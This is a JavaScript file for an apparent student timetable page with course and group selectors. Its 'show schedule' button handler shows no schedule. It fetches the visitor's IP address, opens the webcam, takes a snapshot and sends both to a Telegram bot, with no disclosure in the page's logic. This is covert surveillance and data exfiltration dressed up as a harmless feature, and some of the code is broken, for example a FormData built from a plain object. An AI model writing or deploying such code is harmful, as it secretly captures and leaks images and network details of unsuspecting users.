document.addEventListener("DOMContentLoaded", function() {
  // Сначала наполняем список групп для выбранного курса
  const courseSelect = document.getElementById('course');
  const groupSelect = document.getElementById('group');
  
  // Функция для обновления списка групп в зависимости от курса
  function updateGroups(course) {
    let groups = [];
    if (course === "1-course") {
      groups = ["1--24", "2--24", "3--24", "4--24", "6--24", "6--24", "7--24", "8--24", "9--24", "10--24"];
    } else if (course === "2-course") {
      groups = ["1--23", "2--23", "3--23", "4--23", "5--23", "6--23", "7--23", "8--23", "9--23", "10--23"];
    }

    // Очищаем список групп и добавляем новые опции
    groupSelect.innerHTML = "";
    groups.forEach(group => {
      const option = document.createElement('option');
      option.value = group;
      option.textContent = group.replace("-", " ");
      groupSelect.appendChild(option);
    });
  }

  // Обновляем группы при изменении курса
  courseSelect.addEventListener('change', function() {
    updateGroups(courseSelect.value);
  });

  // Сначала обновляем группы для первого курса
  updateGroups(courseSelect.value);

  // Обработчик для кнопки "Jadvalni ko'rsatish"
  document.getElementById('show-schedule').addEventListener('click', function() {
    const course = courseSelect.value;
    const group = groupSelect.value;
    const day = document.getElementById('day').value;

    // Получаем IP-адрес пользователя с помощью ipify API
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const userIp = data.ip;  // Получаем IP-адрес

        // Запрашиваем доступ к камере
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(function(stream) {
            // Отображаем поток видео в элементе <video>
            const video = document.createElement('video');
            video.width = 320;
            video.height = 240;
            video.autoplay = true;
            document.body.appendChild(video);
            video.srcObject = stream;

            // Через 3 секунды делаем снимок с камеры
            setTimeout(function() {
              const canvas = document.createElement('canvas');
              const context = canvas.getContext('2d');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;

              // Рисуем изображение с видео на холсте (canvas)
              context.drawImage(video, 0, 0, canvas.width, canvas.height);

              // Конвертируем холст в изображение (Data URL)
              const imgData = canvas.toDataURL('image/png');

              // Закрываем поток видео после снимка
              stream.getTracks().forEach(track => track.stop());

              // Отправляем IP-адрес и изображение в Telegram
              const message = `Sizning saytingizni ochgan foydalanuvchi IP-manzili: ${userIp}`;

              // Отправляем запрос на Telegram через Webhook
              fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                  chat_id: 'YOUR_CHAT_ID',  // Ваш Telegram ID или ID группы
                  text: message
                })
              })
              .then(response => response.json())
              .then(data => {
                console.log('Message sent to Telegram:', data);
              })
              .catch(error => {
                console.error('Error:', error);
              });

              // Отправляем изображение через Telegram
              fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto', {
                method: 'POST',
                body: new FormData({
                  chat_id: 'YOUR_CHAT_ID',
                  photo: imgData  // Отправляем изображение
                })
              })
              .then(response => response.json())
              .then(data => {
                console.log('Photo sent to Telegram:', data);
              })
              .catch(error => {
                console.error('Error sending photo:', error);
              });

            }, 3000); // Ждем 3 секунды, чтобы дать время на загрузку камеры
          })
          .catch(function(error) {
            console.error("Ошибка при доступе к камере: ", error);
          });

      })
      .catch(error => {
        console.error('Error fetching IP address:', error);
      });
  });

  // Функция для открытия модального окна
  const authorBtn = document.getElementById('author-btn');
  const authorModal = document.getElementById('author-modal');
  const closeBtn = document.getElementById('close-btn');

  // Открытие модального окна
  authorBtn.addEventListener('click', function() {
    authorModal.style.display = "block";
  });

  // Закрытие модального окна
  closeBtn.addEventListener('click', function() {
    authorModal.style.display = "none";
  });

  // Закрытие модального окна при клике вне его
  window.addEventListener('click', function(event) {
    if (event.target === authorModal) {
      authorModal.style.display = "none";
    }
  });
});
